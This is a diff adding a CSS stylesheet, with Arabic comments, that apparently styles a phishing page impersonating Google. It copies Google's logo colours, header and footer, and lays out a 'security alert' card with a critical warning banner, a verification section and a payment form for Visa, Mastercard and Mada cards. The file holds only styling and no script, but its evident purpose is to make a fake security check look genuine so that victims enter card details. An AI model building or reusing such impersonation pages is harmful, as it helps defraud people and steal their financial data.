@@ -1,0 +1,373 @@
+* {
+    margin: 0;
+    padding: 0;
+    box-sizing: border-box;
+    font-family: 'Segoe UI', Roboto, Arial, sans-serif;
+}
+
+body {
+    background-color: #f8f9fa;
+    color: #3c4043;
+    line-height: 1.6;
+    min-height: 100vh;
+    display: flex;
+    flex-direction: column;
+}
+
+.google-container {
+    min-height: 100vh;
+    display: flex;
+    flex-direction: column;
+}
+
+/* الهيدر */
+.google-header {
+    background-color: white;
+    border-bottom: 1px solid #dadce0;
+    padding: 12px 0;
+    position: sticky;
+    top: 0;
+    z-index: 100;
+}
+
+.header-content {
+    max-width: 1200px;
+    margin: 0 auto;
+    padding: 0 20px;
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+}
+
+.google-logo {
+    font-size: 22px;
+    font-weight: 500;
+    letter-spacing: -0.5px;
+}
+
+.google-logo span:nth-child(1) { color: #4285F4; }
+.google-logo span:nth-child(2) { color: #EA4335; }
+.google-logo span:nth-child(3) { color: #FBBC05; }
+.google-logo span:nth-child(4) { color: #4285F4; }
+.google-logo span:nth-child(5) { color: #34A853; }
+.google-logo span:nth-child(6) { color: #EA4335; }
+
+.nav-link {
+    color: #5f6368;
+    text-decoration: none;
+    font-size: 14px;
+    margin-left: 24px;
+    transition: color 0.2s;
+}
+
+.nav-link:hover {
+    color: #1a73e8;
+}
+
+/* المحتوى الرئيسي */
+.main-content {
+    flex: 1;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    padding: 40px 20px;
+}
+
+.security-card {
+    background: white;
+    border-radius: 8px;
+    box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+    padding: 40px;
+    width: 100%;
+    max-width: 500px;
+    border: 1px solid #dadce0;
+}
+
+.security-header {
+    text-align: center;
+    margin-bottom: 24px;
+}
+
+.security-icon {
+    margin-bottom: 16px;
+    color: #EA4335;
+    font-size: 48px;
+}
+
+.security-title {
+    font-size: 24px;
+    font-weight: 400;
+    color: #3c4043;
+}
+
+/* بانر التنبيه */
+.alert-banner {
+    display: flex;
+    align-items: center;
+    padding: 16px;
+    border-radius: 8px;
+    margin-bottom: 24px;
+}
+
+.alert-banner.critical {
+    background: #fce8e6;
+    border: 1px solid #ea4335;
+}
+
+.alert-icon {
+    color: #ea4335;
+    font-size: 20px;
+    margin-left: 12px;
+    flex-shrink: 0;
+}
+
+.alert-content strong {
+    color: #ea4335;
+    display: block;
+    margin-bottom: 4px;
+}
+
+.alert-content p {
+    color: #5f6368;
+    font-size: 14px;
+}
+
+.warning-message {
+    background: #f8f9fa;
+    padding: 16px;
+    border-radius: 8px;
+    margin-bottom: 24px;
+    border-right: 4px solid #1a73e8;
+}
+
+.warning-message p {
+    color: #5f6368;
+    font-size: 14px;
+}
+
+/* قسم التحقق */
+.verification-section {
+    margin: 32px 0;
+}
+
+.verification-section h3 {
+    font-size: 18px;
+    font-weight: 500;
+    margin-bottom: 8px;
+    color: #3c4043;
+}
+
+.section-description {
+    color: #5f6368;
+    font-size: 14px;
+    margin-bottom: 24px;
+}
+
+/* النموذج */
+.payment-form {
+    margin-top: 20px;
+}
+
+.form-group {
+    margin-bottom: 20px;
+}
+
+.form-label {
+    display: block;
+    margin-bottom: 8px;
+    font-size: 14px;
+    font-weight: 500;
+    color: #3c4043;
+}
+
+.form-input {
+    width: 100%;
+    padding: 12px 14px;
+    border: 1px solid #dadce0;
+    border-radius: 4px;
+    font-size: 16px;
+    transition: border-color 0.2s;
+}
+
+.form-input:focus {
+    outline: none;
+    border-color: #1a73e8;
+    box-shadow: 0 0 0 2px rgba(26,115,232,0.2);
+}
+
+.form-row {
+    display: flex;
+    gap: 16px;
+}
+
+.form-row .form-group {
+    flex: 1;
+}
+
+/* أنواع البطاقات */
+.card-types {
+    display: flex;
+    gap: 12px;
+    margin-top: 8px;
+}
+
+.card-type {
+    padding: 8px 16px;
+    border: 1px solid #dadce0;
+    border-radius: 4px;
+    font-size: 12px;
+    font-weight: 500;
+    background: #f8f9fa;
+}
+
+.card-type.visa {
+    color: #1a1f71;
+    border-color: #1a1f71;
+}
+
+.card-type.mastercard {
+    color: #eb001b;
+    border-color: #eb001b;
+}
+
+.card-type.mada {
+    color: #8bc34a;
+    border-color: #8bc34a;
+}
+
+/* زر التأكيد */
+.verify-button {
+    width: 100%;
+    background: #1a73e8;
+    color: white;
+    border: none;
+    padding: 14px 24px;
+    border-radius: 4px;
+    font-size: 16px;
+    font-weight: 500;
+    cursor: pointer;
+    margin-top: 8px;
+    transition: background 0.2s;
+}
+
+.verify-button:hover {
+    background: #1669d6;
+}
+
+.verify-button:disabled {
+    background: #ccc;
+    cursor: not-allowed;
+}
+
+/* إشعار الأمان */
+.security-notice {
+    display: flex;
+    align-items: center;
+    background: #f8f9fa;
+    padding: 16px;
+    border-radius: 8px;
+    margin-top: 24px;
+}
+
+.notice-icon {
+    color: #34a853;
+    font-size: 20px;
+    margin-left: 12px;
+}
+
+.notice-text strong {
+    color: #34a853;
+    display: block;
+    margin-bottom: 4px;
+}
+
+.notice-text p {
+    color: #5f6368;
+    font-size: 14px;
+}
+
+/* الفوتر */
+.google-footer {
+    background: #f8f9fa;
+    border-top: 1px solid #dadce0;
+    padding: 20px 0;
+    margin-top: auto;
+}
+
+.footer-content {
+    max-width: 1200px;
+    margin: 0 auto;
+    padding: 0 20px;
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+}
+
+.footer-links {
+    display: flex;
+    gap: 24px;
+}
+
+.footer-link {
+    color: #5f6368;
+    text-decoration: none;
+    font-size: 12px;
+}
+
+.footer-link:hover {
+    color: #1a73e8;
+}
+
+.language-select {
+    padding: 8px 12px;
+    border: 1px solid #dadce0;
+    border-radius: 4px;
+    background: white;
+    font-size: 12px;
+    color: #5f6368;
+}
+
+/* التجاوب */
+@media (max-width: 600px) {
+    .security-card {
+        padding: 24px;
+        margin: 20px;
+    }
+    
+    .form-row {
+        flex-direction: column;
+        gap: 0;
+    }
+    
+    .header-content {
+        flex-direction: column;
+        gap: 12px;
+    }
+    
+    .footer-content {
+        flex-direction: column;
+        gap: 12px;
+        text-align: center;
+    }
+    
+    .nav-link {
+        margin-left: 0;
+        margin-right: 16px;
+    }
+}
+
+/* تحميل */
+.loading {
+    display: inline-block;
+    width: 20px;
+    height: 20px;
+    border: 3px solid #ffffff;
+    border-radius: 50%;
+    border-top-color: transparent;
+    animation: spin 1s ease-in-out infinite;
+    margin-left: 10px;
+}
+
+@keyframes spin {
+    to { transform: rotate(360deg); }
+}
